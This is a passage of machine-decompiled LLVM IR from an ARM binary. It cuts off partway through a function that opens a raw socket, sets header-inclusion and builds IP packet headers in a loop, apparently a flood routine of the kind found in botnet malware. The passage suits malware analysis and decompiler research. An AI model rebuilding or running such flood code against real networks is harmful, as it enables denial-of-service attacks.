  uselistorder i32 %v0_bd88, { 0, 2, 1 }
  uselistorder i32 %v3_bd58, { 0, 2, 1 }
  uselistorder i32 %v2_bd24, { 1, 0 }
  uselistorder i32 %v8_bd04, { 1, 2, 0 }
  uselistorder i32 %v3_bcf0, { 1, 0 }
  uselistorder i32 %v0_bce0, { 2, 0, 1, 3 }
  uselistorder i32 %v1_bcac, { 1, 2, 0 }
  uselistorder i32 %v1_bca8, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_bc4c, { 1, 0, 2 }
  uselistorder i32 %v4_bc48, { 0, 2, 1 }
  uselistorder i32 %v0_bc28, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_bc18, { 0, 2, 1 }
  uselistorder i32 %v4_bbfc, { 1, 0 }
  uselistorder i32 %v7_bb20, { 2, 1, 0, 3 }
  uselistorder i32 %v0_baf4, { 1, 0 }
  uselistorder i1 %v7_bb3c, { 2, 1, 0 }
  uselistorder i1 %v2_bdb4, { 2, 3, 1, 0 }
  uselistorder i1 %v3_bd44, { 1, 0, 2, 3 }
  uselistorder i32 %v0_ba7c, { 1, 0, 2 }
  uselistorder i32 %v3_b8e4, { 1, 0 }
  uselistorder i32 %tmp88, { 1, 0 }
  uselistorder i32 %v1_b888, { 1, 0 }
  uselistorder i32 %v1_b884, { 2, 1, 0 }
  uselistorder i32 %v1_b870, { 1, 0 }
  uselistorder i32 %v1_b86c, { 2, 1, 0 }
  uselistorder i32 %v1_b864, { 0, 2, 1 }
  uselistorder i32 %v3_b85c, { 2, 1, 0 }
  uselistorder i32 %v0_b838, { 1, 0, 2 }
  uselistorder i32 %v3_b82c, { 2, 1, 3, 0 }
  uselistorder i32 %v1_b824, { 4, 3, 5, 1, 2, 0 }
  uselistorder i32 %v3_b820, { 2, 0, 1 }
  uselistorder i32 %v0_b820, { 2, 1, 0 }
  uselistorder i32 %v0_b818, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_b814, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_b80c, { 1, 0 }
  uselistorder i1 %v7_b7e0, { 1, 0 }
  uselistorder i32 %v3_b7dc, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v5_b7c8, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_b794, { 1, 2, 0 }
  uselistorder i32 %v5_b774, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_b728, { 1, 0 }
  uselistorder i8 %v5_b718, { 1, 0 }
  uselistorder i32 %v5_b6fc, { 1, 0 }
  uselistorder i32 %v6_b6c0, { 1, 0 }
  uselistorder i32 %v2_b6a8, { 0, 3, 1, 2 }
  uselistorder i32 %v1_b68c, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 37, 39, 40, 42, 41, 43, 44, 46, 45, 48, 47, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 6, 7, 4, 5, 9, 8, 10, 13, 11, 12, 14, 16, 15, 17, 19, 18, 20, 21, 22, 23, 25, 24, 29, 26, 27, 28, 32, 30, 31, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 21, 22, 19, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_bdc8, { 1, 0 }
  uselistorder label %bb100, { 1, 0 }
  uselistorder label %dec_label_pc_bcc4, { 1, 0 }
  uselistorder label %dec_label_pc_bbe8, { 1, 0 }
  uselistorder label %dec_label_pc_bb84, { 2, 0, 1 }
  uselistorder label %dec_label_pc_baf4.preheader, { 1, 0 }
  uselistorder label %bb97, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb92, { 1, 0 }
  uselistorder label %.thread21, { 2, 1, 0 }
}

define i32 @function_be04(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_be04:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_be04 = load i32, i32* @r4, align 4
  %v6_be04 = load i32, i32* @r5, align 4
  %v9_be04 = load i32, i32* @r6, align 4
  %v12_be04 = load i32, i32* @r7, align 4
  %v15_be04 = load i32, i32* @r8, align 4
  %v1_be08 = urem i32 %arg1, 256
  store i32 %v1_be08, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %v1_be08, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_be20 = urem i32 %arg3, 256
  store i32 %v1_be20, i32* @r4, align 4
  %v2_be24 = call i32 @_calloc(i32 %v1_be08, i32 4)
  %v0_be28 = load i32, i32* @r5, align 4
  store i32 %v0_be28, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_be38 = load i32, i32* @r4, align 4
  store i32 %v0_be38, i32* %r0.global-to-local, align 4
  %v5_be3c = inttoptr i32 %v0_be28 to i32*
  %v6_be3c = call i32 @function_b240(i32 %v0_be38, i32* %v5_be3c, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_be54 = load i32, i32* @r5, align 4
  store i32 %v0_be54, i32* %r1.global-to-local, align 4
  %v0_be58 = load i32, i32* @r4, align 4
  store i32 %v0_be58, i32* %r0.global-to-local, align 4
  %v5_be5c = trunc i32 %v6_be3c to i8
  %v6_be60 = inttoptr i32 %v0_be54 to i32*
  %v7_be60 = call i32 @function_b240(i32 %v0_be58, i32* %v6_be60, i32 3, i32 65535)
  %v0_be64 = load i32, i32* @r5, align 4
  store i32 %v0_be64, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_be60, i32* @r7, align 4
  %v0_be74 = load i32, i32* @r4, align 4
  store i32 %v0_be74, i32* %r0.global-to-local, align 4
  %v4_be78 = inttoptr i32 %v0_be64 to i32*
  %v5_be78 = call i32 @function_b240(i32 %v0_be74, i32* %v4_be78, i32 4, i32 64)
  %v0_be84 = load i32, i32* @r5, align 4
  store i32 %v0_be84, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_be90 = load i32, i32* @r4, align 4
  store i32 %v0_be90, i32* %r0.global-to-local, align 4
  %v5_be94 = trunc i32 %v5_be78 to i8
  %v6_be98 = inttoptr i32 %v0_be84 to i32*
  %v7_be98 = call i32 @function_b240(i32 %v0_be90, i32* %v6_be98, i32 5, i32 1)
  %v1_bea4 = urem i32 %v7_be98, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_beb0 = load i32, i32* @r5, align 4
  store i32 %v0_beb0, i32* %r1.global-to-local, align 4
  %v0_beb4 = load i32, i32* @r4, align 4
  store i32 %v0_beb4, i32* %r0.global-to-local, align 4
  %v5_bebc = inttoptr i32 %v0_beb0 to i32*
  %v6_bebc = call i32 @function_b240(i32 %v0_beb4, i32* %v5_bebc, i32 6, i32 65535)
  %v0_bec4 = load i32, i32* @r5, align 4
  store i32 %v0_bec4, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_bebc, i32* @sl, align 4
  %v0_bed4 = load i32, i32* @r4, align 4
  store i32 %v0_bed4, i32* %r0.global-to-local, align 4
  %v4_bed8 = inttoptr i32 %v0_bec4 to i32*
  %v5_bed8 = call i32 @function_b240(i32 %v0_bed4, i32* %v4_bed8, i32 7, i32 65535)
  %v0_bedc = load i32, i32* @r5, align 4
  store i32 %v0_bedc, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_bed8, i32* @r8, align 4
  %v0_beec = load i32, i32* @r4, align 4
  store i32 %v0_beec, i32* %r0.global-to-local, align 4
  %v4_bef0 = inttoptr i32 %v0_bedc to i32*
  %v5_bef0 = call i32 @function_b240(i32 %v0_beec, i32* %v4_bef0, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bf00 = load i32, i32* @r5, align 4
  store i32 %v0_bf00, i32* %r1.global-to-local, align 4
  %v0_bf04 = load i32, i32* @r4, align 4
  store i32 %v0_bf04, i32* %r0.global-to-local, align 4
  %v4_bf08 = inttoptr i32 %v0_bf00 to i32*
  %v5_bf08 = call i32 @function_b240(i32 %v0_bf04, i32* %v4_bf08, i32 1, i32 1)
  %v1_bf10 = urem i32 %v5_bf08, 256
  %v0_bf14 = load i32, i32* @r5, align 4
  store i32 %v0_bf14, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bf20 = load i32, i32* @r4, align 4
  store i32 %v0_bf20, i32* %r0.global-to-local, align 4
  %v5_bf28 = inttoptr i32 %v0_bf14 to i32*
  %v6_bf28 = call i32 @function_b240(i32 %v0_bf20, i32* %v5_bf28, i32 19, i32 0)
  %v0_bf30 = load i32, i32* @r5, align 4
  store i32 %v0_bf30, i32* %r1.global-to-local, align 4
  %v2_bf34 = load i32, i32* @global_var_1d9ac.143, align 4
  store i32 %v2_bf34, i32* %r3.global-to-local, align 4
  store i32 %v6_bf28, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_bf40 = load i32, i32* @r4, align 4
  store i32 %v0_bf40, i32* %r0.global-to-local, align 4
  %v4_bf44 = inttoptr i32 %v0_bf30 to i32*
  %v5_bf44 = call i32 @function_b240(i32 %v0_bf40, i32* %v4_bf44, i32 25, i32 %v2_bf34)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_bf58 = call i32 @_socket(i32 2, i32 3, i32 6)
  store i32 %v3_bf58, i32* %r0.global-to-local, align 4
  %v7_bf5c = icmp eq i32 %v3_bf58, -1
  store i1 %v7_bf5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bf5c, label %dec_label_pc_c3dc, label %dec_label_pc_bf68

dec_label_pc_bf68:                                ; preds = %dec_label_pc_be04
  store i32 1, i32* %stack_var_-40, align 4
  %v6_bf70 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_bf70, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_bf84 = call i32 @_setsockopt(i32 %v3_bf58, i32 0, i32 3, i32 %v6_bf70, i32 4)
  store i32 %v5_bf84, i32* %r0.global-to-local, align 4
  %v7_bf88 = icmp eq i32 %v5_bf84, -1
  store i1 %v7_bf88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bf88, label %dec_label_pc_c3d4, label %dec_label_pc_bf90

dec_label_pc_bf90:                                ; preds = %dec_label_pc_bf68
  %v0_bf90 = load i32, i32* @sl, align 4
  %v0_bf9c = load i32, i32* @r8, align 4
  %v3_bf9c = mul i32 %v0_bf9c, 65536
  store i32 %v3_bf9c, i32* %r8.global-to-local, align 4
  %v0_bfa0 = load i32, i32* @r7, align 4
  %v3_bfa0 = mul i32 %v0_bfa0, 65536
  store i32 %v3_bfa0, i32* %r7.global-to-local, align 4
  %v0_bfa4 = load i32, i32* @r6, align 4
  %v1_bfa4 = urem i32 %v0_bfa4, 256
  store i32 %v1_bfa4, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_bfac = urem i32 %v0_bf90, 65536
  store i32 %v3_bfac, i32* %r2.global-to-local, align 4
  %v3_bfb0 = urem i32 %v0_bf9c, 65536
  store i32 %v3_bfb0, i32* %r3.global-to-local, align 4
  %v0_bfb4 = load i32, i32* @fp, align 4
  %v2_bfb4 = icmp eq i32 %v0_bfb4, 0
  store i1 %v2_bfb4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %v3_bfc4 = urem i32 %v0_bfa0, 65536
  store i32 %v3_bfc4, i32* @sl, align 4
  %tmp84 = icmp slt i32 %v0_bfb4, 1
  br i1 %tmp84, label %dec_label_pc_c500, label %dec_label_pc_bfd4

dec_label_pc_bfd4:                                ; preds = %dec_label_pc_bf90
  %v3_bfd8 = mul i32 %v5_bef0, 65536
  %v1_bfdc = add i32 %v3_bfd8, 3407872
  %v3_bfe4 = udiv i32 %v1_bfdc, 256
  %v0_bfa0.not = or i32 %v0_bfa0, -65536
  %v1_bff4 = xor i32 %v0_bfa0.not, 65535
  %v1_bff8 = urem i32 %v0_bf9c, 256
  %tmp85 = mul nsw i32 %v1_bff4, 256
  %v1_c010 = and i32 %v3_bfe4, 65280
  %v1_c014 = add i32 %v3_bfd8, 524288
  %v4_c018 = udiv i32 %v1_bfdc, 16777216
  %v5_c018 = or i32 %v1_c010, %v4_c018
  store i32 %v5_c018, i32* %r0.global-to-local, align 4
  %v1_c01c = add i32 %v3_bfd8, 1835008
  %v1_c024 = and i32 %tmp85, 65280
  store i32 %v1_c024, i32* %lr.global-to-local, align 4
  %tmp86 = udiv i32 %v1_bff4, 256
  %tmp87 = udiv i32 %v0_bfa0, 256
  %v5_c038 = trunc i32 %tmp86 to i8
  %tmp88 = udiv i32 %v0_bf90, 256
  %sext29 = mul i32 %tmp87, 16777216
  %v4_c058 = sdiv i32 %sext29, 16777216
  %v3_c064 = mul nuw nsw i32 %v1_bff8, 256
  store i32 %v3_c064, i32* %r5.global-to-local, align 4
  %v3_c068 = udiv i32 %v1_c014, 256
  %tmp89 = udiv i32 %v0_bf9c, 256
  %v4_c070 = urem i32 %tmp89, 256
  %v5_c070 = or i32 %v4_c070, %v3_c064
  store i32 %v5_c070, i32* %r7.global-to-local, align 4
  %v3_c074 = ashr i32 %sext29, 31
  %v3_c080 = sdiv i32 %v1_c01c, 16777216
  %v1_c084 = and i32 %v3_c068, 65280
  store i32 %v1_c084, i32* %r6.global-to-local, align 4
  %sext30 = mul i32 %tmp88, 16777216
  %v4_c08c = sdiv i32 %sext30, 16777216
  %v3_c090 = ashr i32 %v1_c01c, 31
  %v3_c094 = udiv i32 %v1_bff4, 65536
  %v4_c098 = udiv i32 %v1_c014, 16777216
  %v5_c098 = or i32 %v1_c084, %v4_c098
  store i32 %v5_c098, i32* %r8.global-to-local, align 4
  %v3_c0a4 = ashr i32 %sext30, 31
  store i32 %v3_c0a4, i32* %r1.global-to-local, align 4
  store i32 %v1_bff8, i32* %r2.global-to-local, align 4
  %v3_c0ac41 = udiv i32 %v1_c084, 256
  store i32 %v3_c0ac41, i32* %r3.global-to-local, align 4
  %v5_c0b4 = trunc i32 %v3_c0a4 to i8
  store i32 0, i32* %r4.global-to-local, align 4
  %v4_c110 = sext i8 %v5_be94 to i32
  %sext = mul i32 %v1_bfdc, 256
  %v4_c118 = sdiv i32 %sext, 16777216
  %sext16 = mul nuw i32 %v4_c018, 16777216
  %v4_c128 = sdiv i32 %sext16, 16777216
  %v2_c1fc = icmp eq i32 %v1_bfa4, 0
  %sext20 = mul i32 %v1_c014, 256
  %v4_c21c = sdiv i32 %sext20, 16777216
  %sext21 = mul i32 %v0_bf9c, 16777216
  %v7_c234 = sdiv i32 %sext21, 16777216
  %v1_c124 = trunc i32 %v4_c118 to i8
  br label %dec_label_pc_c0c4

dec_label_pc_c0c4:                                ; preds = %bb96, %dec_label_pc_bfd4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_c0d0 = call i32 @_calloc(i32 1510, i32 4)
  store i32 %v2_c0d0, i32* %r0.global-to-local, align 4
  store i32 %v2_be24, i32* %r1.global-to-local, align 4
  %v3_c0d8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c0d8, i32* %r3.global-to-local, align 4
  %v2_c0dc = load i32, i32* %r4.global-to-local, align 4
  %v5_c0dc = mul i32 %v2_c0dc, 4
  %v6_c0dc = add i32 %v5_c0dc, %v2_be24
  %v7_c0dc = inttoptr i32 %v6_c0dc to i32*
  store i32 %v2_c0d0, i32* %v7_c0dc, align 4
  %v0_c0e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_c0e0 = load i32, i32* %r3.global-to-local, align 4
  %v4_c0e0 = mul i32 %v1_c0e0, 4
  %v5_c0e0 = add i32 %v4_c0e0, %v0_c0e0
  %v6_c0e0 = inttoptr i32 %v5_c0e0 to i32*
  %v7_c0e0 = load i32, i32* %v6_c0e0, align 4
  store i32 %v7_c0e0, i32* %r4.global-to-local, align 4
  %v1_c0e4 = inttoptr i32 %v7_c0e0 to i8*
  %v2_c0e4 = load i8, i8* %v1_c0e4, align 1
  %tmp = urem i8 %v2_c0e4, 16
  %v1_c0e8 = zext i8 %tmp to i32
  %v1_c0ec = or i32 %v1_c0e8, 64
  store i32 %v1_c0ec, i32* %r2.global-to-local, align 4
  %v1_c0f0 = trunc i32 %v1_c0ec to i8
  store i8 %v1_c0f0, i8* %v1_c0e4, align 1
  %v0_c0f4 = load i32, i32* %r4.global-to-local, align 4
  %v1_c0f4 = inttoptr i32 %v0_c0f4 to i8*
  %v2_c0f4 = load i8, i8* %v1_c0f4, align 1
  %v1_c0f8 = and i8 %v2_c0f4, -16
  %v1_c0fc = or i8 %v1_c0f8, 5
  store i32 %v1_bea4, i32* %r2.global-to-local, align 4
  store i8 %v1_c0fc, i8* %v1_c0f4, align 1
  %v2_c10c = load i32, i32* %r4.global-to-local, align 4
  %v3_c10c = add i32 %v2_c10c, 1
  %v4_c10c = inttoptr i32 %v3_c10c to i8*
  store i8 %v5_be5c, i8* %v4_c10c, align 1
  store i32 %v4_c110, i32* %r1.global-to-local, align 4
  %v2_c114 = load i32, i32* %r4.global-to-local, align 4
  %v3_c114 = add i32 %v2_c114, 8
  %v4_c114 = inttoptr i32 %v3_c114 to i8*
  store i8 %v5_be94, i8* %v4_c114, align 1
  store i32 %v4_c118, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_c120 = load i32, i32* %r2.global-to-local, align 4
  %v9_c120 = icmp eq i32 %v0_c120, 0
  store i1 %v9_c120, i1* %cpsr_z.global-to-local, align 1
  %v2_c124 = load i32, i32* %r4.global-to-local, align 4
  %v3_c124 = add i32 %v2_c124, 3
  %v4_c124 = inttoptr i32 %v3_c124 to i8*
  store i8 %v1_c124, i8* %v4_c124, align 1
  store i32 %v4_c128, i32* %r2.global-to-local, align 4
  %v0_c12c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c12c, label %.thread23, label %.thread

.thread:                                          ; preds = %dec_label_pc_c0c4
  %v1_c12c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_c12c, i32* %r3.global-to-local, align 4
  %v2_c130 = trunc i32 %v1_c12c to i8
  %v3_c130 = load i32, i32* %r4.global-to-local, align 4
  %v4_c130 = add i32 %v3_c130, 7
  %v5_c130 = inttoptr i32 %v4_c130 to i8*
  store i8 %v2_c130, i8* %v5_c130, align 1
  %v0_c134.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c134.pr.pr, label %.thread23, label %bb

bb:                                               ; preds = %.thread
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_c138 = load i32, i32* %r4.global-to-local, align 4
  %v4_c138 = add i32 %v3_c138, 6
  %v5_c138 = inttoptr i32 %v4_c138 to i8*
  store i8 64, i8* %v5_c138, align 1
  br label %.thread23

.thread23:                                        ; preds = %dec_label_pc_c0c4, %.thread, %bb
  %v0_c13c = load i32, i32* %r2.global-to-local, align 4
  %v1_c13c = trunc i32 %v0_c13c to i8
  %v2_c13c = load i32, i32* %r4.global-to-local, align 4
  %v3_c13c = add i32 %v2_c13c, 2
  %v4_c13c = inttoptr i32 %v3_c13c to i8*
  store i8 %v1_c13c, i8* %v4_c13c, align 1
  store i32 %v3_c074, i32* %r2.global-to-local, align 4
  store i32 %v4_c058, i32* %r1.global-to-local, align 4
  %v2_c14c = load i32, i32* %r4.global-to-local, align 4
  %v3_c14c = add i32 %v2_c14c, 9
  %v4_c14c = inttoptr i32 %v3_c14c to i8*
  store i8 47, i8* %v4_c14c, align 1
  %v0_c150 = load i32, i32* %r2.global-to-local, align 4
  %v1_c150 = trunc i32 %v0_c150 to i8
  %v2_c150 = load i32, i32* %r4.global-to-local, align 4
  %v3_c150 = add i32 %v2_c150, 5
  %v4_c150 = inttoptr i32 %v3_c150 to i8*
  store i8 %v1_c150, i8* %v4_c150, align 1
  %v3_c154 = load i32, i32* %stack_var_-40, align 4
  %v5_c15c = mul i32 %v3_c154, 24
  store i32 %v5_c15c, i32* %r3.global-to-local, align 4
  store i32 %v5_bf44, i32* %r2.global-to-local, align 4
  %v1_c164 = load i32, i32* %r4.global-to-local, align 4
  %v2_c164 = add i32 %v1_c164, 12
  %v3_c164 = inttoptr i32 %v2_c164 to i32*
  store i32 %v5_bf44, i32* %v3_c164, align 4
  %v0_c168 = load i32, i32* %r3.global-to-local, align 4
  %v1_c168 = load i32, i32* @sb, align 4
  %v2_c168 = add i32 %v1_c168, %v0_c168
  store i32 %v2_c168, i32* %r3.global-to-local, align 4
  %v0_c16c = load i32, i32* %r1.global-to-local, align 4
  %v1_c16c = trunc i32 %v0_c16c to i8
  %v2_c16c = load i32, i32* %r4.global-to-local, align 4
  %v3_c16c = add i32 %v2_c16c, 4
  %v4_c16c = inttoptr i32 %v3_c16c to i8*
  store i8 %v1_c16c, i8* %v4_c16c, align 1
  %v0_c170 = load i32, i32* %r3.global-to-local, align 4
  %v1_c170 = add i32 %v0_c170, 16
  %v2_c170 = inttoptr i32 %v1_c170 to i32*
  %v3_c170 = load i32, i32* %v2_c170, align 4
  store i32 %v3_c170, i32* %r2.global-to-local, align 4
  %v0_c174 = load i32, i32* %r4.global-to-local, align 4
  %v1_c174 = add i32 %v0_c174, 20
  store i32 %v1_c174, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_c17c = load i32, i32* %r0.global-to-local, align 4
  %v1_c17c = trunc i32 %v0_c17c to i8
  %v3_c17c = add i32 %v0_c174, 23
  %v4_c17c = inttoptr i32 %v3_c17c to i8*
  store i8 %v1_c17c, i8* %v4_c17c, align 1
  %v0_c180 = load i32, i32* %r3.global-to-local, align 4
  %v1_c180 = trunc i32 %v0_c180 to i8
  %v2_c180 = load i32, i32* %r1.global-to-local, align 4
  %v3_c180 = add i32 %v2_c180, 2
  %v4_c180 = inttoptr i32 %v3_c180 to i8*
  store i8 %v1_c180, i8* %v4_c180, align 1
  %v0_c184 = load i32, i32* %r4.global-to-local, align 4
  %v1_c184 = add i32 %v0_c184, 24
  %v2_c184 = inttoptr i32 %v1_c184 to i8*
  %v3_c184 = load i8, i8* %v2_c184, align 1
  %tmp104 = urem i8 %v3_c184, 16
  %v1_c188 = zext i8 %tmp104 to i32
  %v1_c18c = or i32 %v1_c188, 64
  store i32 %v1_c18c, i32* %r3.global-to-local, align 4
  %v1_c190 = trunc i32 %v1_c18c to i8
  store i8 %v1_c190, i8* %v2_c184, align 1
  %v0_c194 = load i32, i32* %r2.global-to-local, align 4
  %v1_c194 = load i32, i32* %r4.global-to-local, align 4
  %v2_c194 = add i32 %v1_c194, 16
  %v3_c194 = inttoptr i32 %v2_c194 to i32*
  store i32 %v0_c194, i32* %v3_c194, align 4
  %v0_c198 = load i32, i32* %r4.global-to-local, align 4
  %v1_c198 = add i32 %v0_c198, 24
  %v2_c198 = inttoptr i32 %v1_c198 to i8*
  %v3_c198 = load i8, i8* %v2_c198, align 1
  %v1_c19c = and i8 %v3_c198, -16
  %v1_c1a0 = or i8 %v1_c19c, 5
  store i8 %v1_c1a0, i8* %v2_c198, align 1
  %v0_c1ac = load i32, i32* %r4.global-to-local, align 4
  %v1_c1ac = add i32 %v0_c1ac, 24
  store i32 %v1_c1ac, i32* %r5.global-to-local, align 4
  %v3_c1b0 = add i32 %v0_c1ac, 25
  %v4_c1b0 = inttoptr i32 %v3_c1b0 to i8*
  store i8 %v5_be5c, i8* %v4_c1b0, align 1
  store i32 %v3_c080, i32* %r1.global-to-local, align 4
  store i32 %tmp86, i32* %r3.global-to-local, align 4
  store i32 %v3_c090, i32* %r2.global-to-local, align 4
  %v2_c1c0 = load i32, i32* %r5.global-to-local, align 4
  %v3_c1c0 = add i32 %v2_c1c0, 4
  %v4_c1c0 = inttoptr i32 %v3_c1c0 to i8*
  store i8 %v5_c038, i8* %v4_c1c0, align 1
  %v0_c1c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_c1c4 = trunc i32 %v0_c1c4 to i8
  %v2_c1c4 = load i32, i32* %r5.global-to-local, align 4
  %v3_c1c4 = add i32 %v2_c1c4, 2
  %v4_c1c4 = inttoptr i32 %v3_c1c4 to i8*
  store i8 %v1_c1c4, i8* %v4_c1c4, align 1
  %v0_c1c8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c1c8, label %bb91, label %bb90

bb90:                                             ; preds = %.thread23
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb91

bb91:                                             ; preds = %.thread23, %bb90
  store i32 %v3_c094, i32* %r1.global-to-local, align 4
  %v0_c1d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_c1d0 = trunc i32 %v0_c1d0 to i8
  %v2_c1d0 = load i32, i32* %r5.global-to-local, align 4
  %v3_c1d0 = add i32 %v2_c1d0, 3
  %v4_c1d0 = inttoptr i32 %v3_c1d0 to i8*
  store i8 %v1_c1d0, i8* %v4_c1d0, align 1
  store i32 %v4_c110, i32* %r2.global-to-local, align 4
  %v0_c1d8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c1d8, label %bb93, label %bb92

bb92:                                             ; preds = %bb91
  %v1_c1d8 = load i32, i32* %r3.global-to-local, align 4
  %v2_c1d8 = trunc i32 %v1_c1d8 to i8
  %v3_c1d8 = load i32, i32* %r5.global-to-local, align 4
  %v4_c1d8 = add i32 %v3_c1d8, 6
  %v5_c1d8 = inttoptr i32 %v4_c1d8 to i8*
  store i8 %v2_c1d8, i8* %v5_c1d8, align 1
  br label %bb93

bb93:                                             ; preds = %bb91, %bb92
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_c1e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_c1e0 = trunc i32 %v0_c1e0 to i8
  %v2_c1e0 = load i32, i32* %r5.global-to-local, align 4
  %v3_c1e0 = add i32 %v2_c1e0, 5
  %v4_c1e0 = inttoptr i32 %v3_c1e0 to i8*
  store i8 %v1_c1e0, i8* %v4_c1e0, align 1
  %v0_c1e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c1e4 = trunc i32 %v0_c1e4 to i8
  %v2_c1e4 = load i32, i32* %r5.global-to-local, align 4
  %v3_c1e4 = add i32 %v2_c1e4, 8
  %v4_c1e4 = inttoptr i32 %v3_c1e4 to i8*
  store i8 %v1_c1e4, i8* %v4_c1e4, align 1
  %v0_c1e8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c1e8, label %bb95, label %bb94

bb94:                                             ; preds = %bb93
  %v1_c1e8 = load i32, i32* %r0.global-to-local, align 4
  %v2_c1e8 = trunc i32 %v1_c1e8 to i8
  %v3_c1e8 = load i32, i32* %r5.global-to-local, align 4
  %v4_c1e8 = add i32 %v3_c1e8, 7
  %v5_c1e8 = inttoptr i32 %v4_c1e8 to i8*
  store i8 %v2_c1e8, i8* %v5_c1e8, align 1
  br label %bb95

bb95:                                             ; preds = %bb93, %bb94
  %v0_c1ec = load i32, i32* %r3.global-to-local, align 4
